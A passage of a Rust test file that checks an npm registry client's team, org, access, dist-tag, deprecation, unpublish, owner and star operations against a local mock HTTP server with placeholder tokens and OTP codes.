        assert!(lower.contains("authorization: bearer registry-token"));
        assert!(lower.contains("npm-otp: 123456"));
        let body: serde_json::Value = serde_json::from_slice(&buffer[body_start..]).unwrap();
        assert_eq!(body, serde_json::json!({"package": "@demo/pkg"}));
        let response = "HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
        stream.write_all(response.as_bytes()).unwrap();
    });

    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("ci.npmrc"),
        format!("registry=http://{addr}/\n//{addr}/:_authToken=registry-token\n"),
    )
    .unwrap();

    let packages = read_npm_access_packages(
        dir.path(),
        "@demo:publishers",
        None,
        None,
        Some(Path::new("ci.npmrc")),
    )
    .unwrap();
    assert_eq!(packages.registry, format!("http://{addr}/"));
    assert_eq!(
        packages.items.get("@demo/pkg").map(String::as_str),
        Some("read-write")
    );
    assert_eq!(
        packages.items.get("@demo/readme").map(String::as_str),
        Some("read-only")
    );

    let collaborators = read_npm_access_collaborators(
        dir.path(),
        "@demo/pkg",
        Some("bob"),
        None,
        Some(Path::new("ci.npmrc")),
    )
    .unwrap();
    assert_eq!(collaborators.package.as_deref(), Some("@demo/pkg"));
    assert_eq!(collaborators.items.len(), 1);
    assert_eq!(
        collaborators.items.get("bob").map(String::as_str),
        Some("read-only")
    );

    let grant = grant_npm_access(
        dir.path(),
        "@demo:publishers",
        "@demo/pkg",
        "read-write",
        None,
        Some(Path::new("ci.npmrc")),
        Some("123456"),
    )
    .unwrap();
    assert_eq!(grant.action, "grant");
    assert_eq!(grant.status, 201);

    let revoke = revoke_npm_access(
        dir.path(),
        "@demo:publishers",
        "@demo/pkg",
        None,
        Some(Path::new("ci.npmrc")),
        Some("123456"),
    )
    .unwrap();
    assert_eq!(revoke.action, "revoke");
    assert_eq!(revoke.status, 204);
    handle.join().unwrap();
}

#[test]
fn manages_npm_org_members_with_userconfig_auth_and_otp() {
    use std::io::Write as _;

    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let handle = std::thread::spawn(move || {
        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("PUT /-/org/demo/user "));
        let lower = headers.to_ascii_lowercase();
        assert!(lower.contains("authorization: bearer registry-token"));
        assert!(lower.contains("npm-otp: 123456"));
        let body: serde_json::Value = serde_json::from_slice(&buffer[body_start..]).unwrap();
        assert_eq!(body, serde_json::json!({"user": "alice", "role": "admin"}));
        let response_body = r#"{"org":{"name":"demo","size":2},"user":"alice","role":"admin"}"#;
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                response_body.len(),
                response_body
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /-/org/demo/user "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));
        let body = r#"{"alice":"admin","bob":"developer"}"#;
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("DELETE /-/org/demo/user "));
        let lower = headers.to_ascii_lowercase();
        assert!(lower.contains("authorization: bearer registry-token"));
        assert!(lower.contains("npm-otp: 123456"));
        let body: serde_json::Value = serde_json::from_slice(&buffer[body_start..]).unwrap();
        assert_eq!(body, serde_json::json!({"user": "bob"}));
        let response = "HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /-/org/demo/user "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));
        let body = r#"{"alice":"admin"}"#;
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
        stream.write_all(response.as_bytes()).unwrap();
    });

    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("ci.npmrc"),
        format!("registry=http://{addr}/\n//{addr}/:_authToken=registry-token\n"),
    )
    .unwrap();

    let set = set_npm_org_user(
        dir.path(),
        "@demo",
        "@alice",
        Some("admin"),
        None,
        Some(Path::new("ci.npmrc")),
        Some("123456"),
    )
    .unwrap();
    assert_eq!(set.registry, format!("http://{addr}/"));
    assert_eq!(set.action, "set");
    assert_eq!(set.org, "demo");
    assert_eq!(set.user, "alice");
    assert_eq!(set.role.as_deref(), Some("admin"));
    assert_eq!(set.user_count, Some(2));
    assert_eq!(set.status, 200);

    let users = read_npm_org_users(
        dir.path(),
        "demo",
        Some("alice"),
        None,
        Some(Path::new("ci.npmrc")),
    )
    .unwrap();
    assert_eq!(users.org, "demo");
    assert_eq!(users.users.len(), 1);
    assert_eq!(users.users.get("alice").map(String::as_str), Some("admin"));

    let removed = remove_npm_org_user(
        dir.path(),
        "demo",
        "~bob",
        None,
        Some(Path::new("ci.npmrc")),
        Some("123456"),
    )
    .unwrap();
    assert_eq!(removed.action, "rm");
    assert_eq!(removed.user, "bob");
    assert_eq!(removed.user_count, Some(1));
    assert_eq!(removed.status, 204);
    handle.join().unwrap();
}

#[test]
fn manages_npm_teams_with_userconfig_auth_and_otp() {
    use std::io::Write as _;

    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let handle = std::thread::spawn(move || {
        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("PUT /-/org/demo/team "));
        let lower = headers.to_ascii_lowercase();
        assert!(lower.contains("authorization: bearer registry-token"));
        assert!(lower.contains("npm-otp: 123456"));
        let body: serde_json::Value = serde_json::from_slice(&buffer[body_start..]).unwrap();
        assert_eq!(body["name"], "publishers");
        assert!(body["description"].is_null());
        let response_body = r#"{"ok":true}"#;
        let response = format!(
                "HTTP/1.1 201 Created\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                response_body.len(),
                response_body
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("PUT /-/team/demo/publishers/user "));
        let lower = headers.to_ascii_lowercase();
        assert!(lower.contains("authorization: bearer registry-token"));
        assert!(lower.contains("npm-otp: 123456"));
        let body: serde_json::Value = serde_json::from_slice(&buffer[body_start..]).unwrap();
        assert_eq!(body, serde_json::json!({"user": "alice"}));
        let response_body = r#"{"ok":true}"#;
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                response_body.len(),
                response_body
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /-/org/demo/team?format=cli "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));
        let body = r#"["publishers","readers"]"#;
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /-/team/demo/publishers/user?format=cli "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));
        let body = r#"[{"name":"alice"},{"name":"bob"}]"#;
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("DELETE /-/team/demo/publishers/user "));
        let lower = headers.to_ascii_lowercase();
        assert!(lower.contains("authorization: bearer registry-token"));
        assert!(lower.contains("npm-otp: 123456"));
        let body: serde_json::Value = serde_json::from_slice(&buffer[body_start..]).unwrap();
        assert_eq!(body, serde_json::json!({"user": "alice"}));
        let response = "HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("DELETE /-/team/demo/publishers "));
        let lower = headers.to_ascii_lowercase();
        assert!(lower.contains("authorization: bearer registry-token"));
        assert!(lower.contains("npm-otp: 123456"));
        let response = "HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
        stream.write_all(response.as_bytes()).unwrap();
    });

    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("ci.npmrc"),
        format!("registry=http://{addr}/\n//{addr}/:_authToken=registry-token\n"),
    )
    .unwrap();

    let created = create_npm_team(
        dir.path(),
        "@demo:publishers",
        None,
        Some(Path::new("ci.npmrc")),
        Some("123456"),
    )
    .unwrap();
    assert_eq!(created.registry, format!("http://{addr}/"));
    assert_eq!(created.scope, "demo");
    assert_eq!(created.team, "publishers");
    assert_eq!(created.action, "create");
    assert_eq!(created.status, 201);

    let added = add_npm_team_user(
        dir.path(),
        "@demo:publishers",
        "alice",
        None,
        Some(Path::new("ci.npmrc")),
        Some("123456"),
    )
    .unwrap();
    assert_eq!(added.user.as_deref(), Some("alice"));
    assert_eq!(added.action, "add");
    assert_eq!(added.status, 200);

    let teams = read_npm_teams(dir.path(), "@demo", None, Some(Path::new("ci.npmrc"))).unwrap();
    assert_eq!(teams.scope, "demo");
    assert_eq!(teams.items, vec!["publishers", "readers"]);

    let users = read_npm_team_users(
        dir.path(),
        "@demo:publishers",
        None,
        Some(Path::new("ci.npmrc")),
    )
    .unwrap();
    assert_eq!(users.team.as_deref(), Some("publishers"));
    assert_eq!(users.items, vec!["alice", "bob"]);

    let removed = remove_npm_team_user(
        dir.path(),
        "@demo:publishers",
        "alice",
        None,
        Some(Path::new("ci.npmrc")),
        Some("123456"),
    )
    .unwrap();
    assert_eq!(removed.action, "rm");
    assert_eq!(removed.status, 204);

    let destroyed = destroy_npm_team(
        dir.path(),
        "@demo:publishers",
        None,
        Some(Path::new("ci.npmrc")),
        Some("123456"),
    )
    .unwrap();
    assert_eq!(destroyed.action, "destroy");
    assert_eq!(destroyed.status, 204);
    handle.join().unwrap();
}

#[test]
fn mutates_npm_dist_tags_with_userconfig_auth_and_otp() {
    use std::io::Write as _;

    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let handle = std::thread::spawn(move || {
        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("PUT /-/package/demo-pkg/dist-tags/beta "));
        let lower = headers.to_ascii_lowercase();
        assert!(lower.contains("authorization: bearer registry-token"));
        assert!(lower.contains("npm-otp: 123456"));
        let body = String::from_utf8_lossy(&buffer[body_start..]);
        assert_eq!(body, "\"1.0.0\"");

        let response_body = r#"{"ok":true}"#;
        let response = format!(
                "HTTP/1.1 201 Created\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                response_body.len(),
                response_body
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("DELETE /-/package/demo-pkg/dist-tags/beta "));
        let lower = headers.to_ascii_lowercase();
        assert!(lower.contains("authorization: bearer registry-token"));
        assert!(lower.contains("npm-otp: 123456"));

        let response = "HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
        stream.write_all(response.as_bytes()).unwrap();
    });

    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("ci.npmrc"),
        format!("registry=http://{addr}/\n//{addr}/:_authToken=registry-token\n"),
    )
    .unwrap();

    let added = add_npm_dist_tag(
        dir.path(),
        "demo-pkg",
        "1.0.0",
        "beta",
        None,
        Some(Path::new("ci.npmrc")),
        Some("123456"),
    )
    .unwrap();
    assert_eq!(added.registry, format!("http://{addr}/"));
    assert_eq!(added.package, "demo-pkg");
    assert_eq!(added.version.as_deref(), Some("1.0.0"));
    assert_eq!(added.tag, "beta");
    assert_eq!(added.status, 201);
    assert_eq!(added.response["ok"], true);

    let removed = remove_npm_dist_tag(
        dir.path(),
        "demo-pkg",
        "beta",
        None,
        Some(Path::new("ci.npmrc")),
        Some("123456"),
    )
    .unwrap();
    assert_eq!(removed.registry, format!("http://{addr}/"));
    assert_eq!(removed.package, "demo-pkg");
    assert_eq!(removed.version, None);
    assert_eq!(removed.tag, "beta");
    assert_eq!(removed.status, 204);
    assert_eq!(removed.response, serde_json::Value::Null);
    handle.join().unwrap();
}

#[test]
fn deprecates_npm_versions_with_userconfig_auth_and_otp() {
    use std::io::Write as _;

    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let handle = std::thread::spawn(move || {
        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /demo-pkg?write=true "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));

        let packument = r#"{
              "name": "demo-pkg",
              "versions": {
                "1.0.0": {"name": "demo-pkg", "version": "1.0.0"},
                "1.1.0": {"name": "demo-pkg", "version": "1.1.0"},
                "2.0.0": {"name": "demo-pkg", "version": "2.0.0", "deprecated": "old"}
              },
              "dist-tags": {"latest": "2.0.0"}
            }"#;
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                packument.len(),
                packument
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("PUT /demo-pkg "));
        let lower = headers.to_ascii_lowercase();
        assert!(lower.contains("authorization: bearer registry-token"));
        assert!(lower.contains("npm-otp: 123456"));

        let body: serde_json::Value = serde_json::from_slice(&buffer[body_start..]).unwrap();
        assert_eq!(body["versions"]["1.0.0"]["deprecated"], "old line");
        assert_eq!(body["versions"]["1.1.0"]["deprecated"], "old line");
        assert_eq!(body["versions"]["2.0.0"]["deprecated"], "old");

        let response_body = r#"{"ok":true}"#;
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                response_body.len(),
                response_body
            );
        stream.write_all(response.as_bytes()).unwrap();
    });

    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("ci.npmrc"),
        format!("registry=http://{addr}/\n//{addr}/:_authToken=registry-token\n"),
    )
    .unwrap();

    let spec = PackageSpec::parse("npm:demo-pkg@1.x").unwrap();
    let result = deprecate_npm_package(
        dir.path(),
        &spec,
        "old line",
        false,
        None,
        Some(Path::new("ci.npmrc")),
        Some("123456"),
    )
    .unwrap();
    assert_eq!(result.registry, format!("http://{addr}/"));
    assert_eq!(result.package, "demo-pkg");
    assert_eq!(result.requirement, "1.x");
    assert_eq!(result.message, "old line");
    assert_eq!(result.versions, vec!["1.0.0", "1.1.0"]);
    assert_eq!(result.status, Some(200));
    assert_eq!(result.response["ok"], true);
    handle.join().unwrap();
}

#[test]
fn unpublishes_npm_version_with_userconfig_auth_and_otp() {
    use std::io::Write as _;

    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let handle = std::thread::spawn(move || {
        let packument = format!(
            r#"{{
                  "_id": "demo-pkg",
                  "_rev": "1-abc",
                  "_revisions": {{"start": 1}},
                  "_attachments": {{"demo-pkg-1.0.0.tgz": {{}}}},
                  "name": "demo-pkg",
                  "versions": {{
                    "1.0.0": {{"name": "demo-pkg", "version": "1.0.0", "dist": {{"tarball": "http://{addr}/demo-pkg/-/demo-pkg-1.0.0.tgz"}}}},
                    "2.0.0": {{"name": "demo-pkg", "version": "2.0.0", "dist": {{"tarball": "http://{addr}/demo-pkg/-/demo-pkg-2.0.0.tgz"}}}}
                  }},
                  "dist-tags": {{"latest": "2.0.0", "beta": "1.0.0", "old": "1.0.0"}}
                }}"#
        );

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /demo-pkg?write=true "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                packument.len(),
                packument
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("PUT /demo-pkg/-rev/1-abc "));
        let lower = headers.to_ascii_lowercase();
        assert!(lower.contains("authorization: bearer registry-token"));
        assert!(lower.contains("npm-otp: 123456"));
        let body: serde_json::Value = serde_json::from_slice(&buffer[body_start..]).unwrap();
        assert!(body["versions"].get("1.0.0").is_none());
        assert!(body.get("_revisions").is_none());
        assert!(body.get("_attachments").is_none());
        assert_eq!(body["dist-tags"], serde_json::json!({"latest": "2.0.0"}));
        let response_body = r#"{"ok":true}"#;
        let response = format!(
                "HTTP/1.1 201 Created\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                response_body.len(),
                response_body
            );
        stream.write_all(response.as_bytes()).unwrap();

        let fresh_packument = r#"{
              "_id": "demo-pkg",
              "_rev": "2-def",
              "name": "demo-pkg",
              "versions": {
                "2.0.0": {"name": "demo-pkg", "version": "2.0.0"}
              },
              "dist-tags": {"latest": "2.0.0"}
            }"#;
        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /demo-pkg?write=true "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                fresh_packument.len(),
                fresh_packument
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("DELETE /demo-pkg/-/demo-pkg-1.0.0.tgz/-rev/2-def "));
        let lower = headers.to_ascii_lowercase();
        assert!(lower.contains("authorization: bearer registry-token"));
        assert!(lower.contains("npm-otp: 123456"));
        let response = "HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
        stream.write_all(response.as_bytes()).unwrap();
    });

    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("ci.npmrc"),
        format!("registry=http://{addr}/\n//{addr}/:_authToken=registry-token\n"),
    )
    .unwrap();

    let spec = PackageSpec::parse("npm:demo-pkg@1.0.0").unwrap();
    let result = unpublish_npm_package(
        dir.path(),
        &spec,
        false,
        false,
        None,
        Some(Path::new("ci.npmrc")),
        Some("123456"),
    )
    .unwrap();
    assert_eq!(result.registry, format!("http://{addr}/"));
    assert_eq!(result.package, "demo-pkg");
    assert_eq!(result.version.as_deref(), Some("1.0.0"));
    assert_eq!(result.removed_versions, vec!["1.0.0"]);
    assert!(!result.whole_package);
    assert!(result.changed);
    assert_eq!(result.status, Some(201));
    assert_eq!(result.tarball_status, Some(204));
    assert_eq!(result.response["ok"], true);
    handle.join().unwrap();
}

#[test]
fn force_unpublishes_entire_npm_package() {
    use std::io::Write as _;

    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let handle = std::thread::spawn(move || {
        let packument = r#"{
              "_id": "demo-pkg",
              "_rev": "1-abc",
              "name": "demo-pkg",
              "versions": {
                "1.0.0": {"name": "demo-pkg", "version": "1.0.0"}
              },
              "dist-tags": {"latest": "1.0.0"}
            }"#;

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /demo-pkg?write=true "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                packument.len(),
                packument
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("DELETE /demo-pkg/-rev/1-abc "));
        let lower = headers.to_ascii_lowercase();
        assert!(lower.contains("authorization: bearer registry-token"));
        assert!(lower.contains("npm-otp: 123456"));
        let response_body = r#"{"ok":true}"#;
        let response = format!(
                "HTTP/1.1 202 Accepted\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                response_body.len(),
                response_body
            );
        stream.write_all(response.as_bytes()).unwrap();
    });

    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("ci.npmrc"),
        format!("registry=http://{addr}/\n//{addr}/:_authToken=registry-token\n"),
    )
    .unwrap();

    let spec = PackageSpec::parse("npm:demo-pkg").unwrap();
    let result = unpublish_npm_package(
        dir.path(),
        &spec,
        false,
        true,
        None,
        Some(Path::new("ci.npmrc")),
        Some("123456"),
    )
    .unwrap();
    assert_eq!(result.registry, format!("http://{addr}/"));
    assert_eq!(result.package, "demo-pkg");
    assert_eq!(result.version, None);
    assert_eq!(result.removed_versions, vec!["1.0.0"]);
    assert!(result.whole_package);
    assert!(result.changed);
    assert_eq!(result.status, Some(202));
    assert_eq!(result.tarball_status, None);
    assert_eq!(result.response["ok"], true);
    handle.join().unwrap();
}

#[test]
fn reads_and_mutates_npm_owners_with_userconfig_auth_and_otp() {
    use std::io::Write as _;

    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let handle = std::thread::spawn(move || {
        let packument = r#"{
              "_id": "demo-pkg",
              "_rev": "1-abc",
              "name": "demo-pkg",
              "maintainers": [
                {"name": "alice", "email": "alice@example.invalid"},
                {"name": "bob", "email": "bob@example.invalid"}
              ],
              "versions": {"1.0.0": {"name": "demo-pkg", "version": "1.0.0"}}
            }"#;

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /demo-pkg?write=true "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                packument.len(),
                packument
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /-/user/org.couchdb.user:carol "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));
        let user = r#"{"name":"carol","email":"carol@example.invalid"}"#;
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                user.len(),
                user
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /demo-pkg?write=true "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                packument.len(),
                packument
            );
        stream.write_all(response.as_bytes()).unwrap();

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("PUT /demo-pkg/-rev/1-abc "));
        let lower = headers.to_ascii_lowercase();
        assert!(lower.contains("authorization: bearer registry-token"));
        assert!(lower.contains("npm-otp: 123456"));
        let body: serde_json::Value = serde_json::from_slice(&buffer[body_start..]).unwrap();
        assert_eq!(body["_id"], "demo-pkg");
        assert_eq!(body["_rev"], "1-abc");
        assert_eq!(
            body["maintainers"],
            serde_json::json!([
                {"name": "alice", "email": "alice@example.invalid"},
                {"name": "bob", "email": "bob@example.invalid"},
                {"name": "carol", "email": "carol@example.invalid"}
            ])
        );
        let response_body = r#"{"ok":true}"#;
        let response = format!(
                "HTTP/1.1 201 Created\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                response_body.len(),
                response_body
            );
        stream.write_all(response.as_bytes()).unwrap();
    });

    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("ci.npmrc"),
        format!("registry=http://{addr}/\n//{addr}/:_authToken=registry-token\n"),
    )
    .unwrap();

    let spec = PackageSpec::parse("npm:demo-pkg").unwrap();
    let owners =
        read_npm_package_owners(dir.path(), &spec, None, Some(Path::new("ci.npmrc"))).unwrap();
    assert_eq!(owners.registry, format!("http://{addr}/"));
    assert_eq!(owners.package, "demo-pkg");
    assert_eq!(owners.owners.len(), 2);
    assert_eq!(owners.owners[0].username.as_deref(), Some("alice"));
    assert_eq!(
        owners.owners[0].email.as_deref(),
        Some("alice@example.invalid")
    );

    let mutation = mutate_npm_package_owner(
        dir.path(),
        &spec,
        "carol",
        true,
        None,
        Some(Path::new("ci.npmrc")),
        Some("123456"),
    )
    .unwrap();
    assert_eq!(mutation.registry, format!("http://{addr}/"));
    assert_eq!(mutation.package, "demo-pkg");
    assert_eq!(mutation.user, "carol");
    assert!(mutation.added);
    assert!(mutation.changed);
    assert_eq!(mutation.status, Some(201));
    assert_eq!(mutation.owners.len(), 3);
    assert_eq!(mutation.response["ok"], true);
    handle.join().unwrap();
}

#[test]
fn stars_and_unstars_npm_packages_with_userconfig_auth_and_otp() {
    use std::io::Write as _;

    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let handle = std::thread::spawn(move || {
        let whoami = r#"{"username":"alice"}"#;
        let packument = r#"{
              "_id": "demo-pkg",
              "_rev": "1-abc",
              "name": "demo-pkg",
              "users": {"bob": true}
            }"#;

        let (mut stream, _) = listener.accept().unwrap();
        let buffer = read_http_request_bytes(&mut stream);
        let body_start = http_body_start(&buffer).unwrap();
        let headers = String::from_utf8_lossy(&buffer[..body_start]);
        assert!(headers.starts_with("GET /-/whoami "));
        assert!(headers
            .to_ascii_lowercase()
            .contains("authorization: bearer registry-token"));
        let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                whoami.len(),
